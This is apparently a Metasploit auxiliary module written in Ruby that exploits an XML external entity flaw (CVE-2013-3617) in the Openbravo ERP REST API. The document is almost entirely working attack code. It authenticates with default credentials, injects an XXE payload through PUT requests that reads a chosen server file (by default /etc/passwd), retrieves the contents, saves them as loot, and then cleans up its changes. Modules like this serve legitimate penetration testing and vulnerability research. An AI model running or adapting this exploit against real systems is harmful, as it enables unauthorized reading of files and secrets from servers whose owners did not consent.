##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'net/dns'
require 'rexml/document'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Openbravo ERP XXE Arbitrary File Read',
      'Description' => %q{
        The Openbravo ERP XML API expands external entities which can be defined as
        local files. This allows the user to read any files from the FS as the
        user Openbravo is running as (generally not root).

        This module was tested againt Openbravo ERP version 3.0MP25 and 2.50MP6.
      },
      'Author' =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
        ],
      'References' =>
        [
          ['CVE', '2013-3617'],
          ['OSVDB', '99141'],
          ['BID', '63431'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Oct 30 2013'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Openbravo directory path", '/openbravo/']),
        OptString.new('HttpUsername', [true, "The Openbravo user", "Openbravo"]),
        OptString.new('HttpPassword', [true, "The Openbravo password", "openbravo"]),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
        OptString.new('ENDPOINT', [true, "The XML API REST endpoint to use", "ADUser"])
      ], self.class)
  end

  def run
    print_status("Requesting list of entities from endpoint, this may take a minute...")
    users = send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}"),
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
    }, 60)

    if !users or users.code != 200
      fail_with(Failure::NoAccess, "Invalid response. Check your credentials and that the server is correct.")
    end

    xml = path = id = other_id = ''  #for later use
    doc = REXML::Document.new users.body

    doc.root.elements.each do |user|
      id = user.attributes["id"]
      other_id = user.attributes["identifier"]
      print_status("Found #{datastore["ENDPOINT"]}  #{other_id}  with ID: #{id}")

      print_status("Trying #{other_id}")
      xml = %Q{<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT comments ANY >
  <!ENTITY xxe SYSTEM "file://}

      xml << "#{datastore['FILEPATH']}\" > ]>\n"
      xml << '<ob:Openbravo xmlns:ob="http://www.openbravo.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
      xml << "<#{datastore["ENDPOINT"]} id=\"#{id}\" identifier=\"#{other_id}\">"
      xml << "<id>#{id}</id>"
      xml << '<comments>&xxe;</comments>'
      xml << "</#{datastore["ENDPOINT"]}>"
      xml << '</ob:Openbravo>'

      resp = send_request_raw({
        'method' => 'PUT',
        'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
        'data' => xml,
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
      })

      if !resp or resp.code != 200 or resp.body =~ /Not updating entity/
        print_error("Problem updating #{datastore["ENDPOINT"]} #{other_id} with ID: #{id}")
        next
      end

      print_status("Found writable #{datastore["ENDPOINT"]}: #{other_id}")

      u = send_request_raw({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
      })

      u = REXML::Document.new u.body
      path = store_loot('openbravo.file','text/plain/', datastore['RHOST'], u.root.elements["//comments"].first.to_s, "File from Openbravo server #{datastore['RHOST']}")
      break
    end

    if path != ''
      print_status("Cleaning up after ourselves...")

      xml.sub!('&xxe;', '')

      send_request_raw({
        'method' => 'PUT',
        'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
      'data' => xml,
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
      })

      print_good("File saved to: #{path}")
    end
  end
end
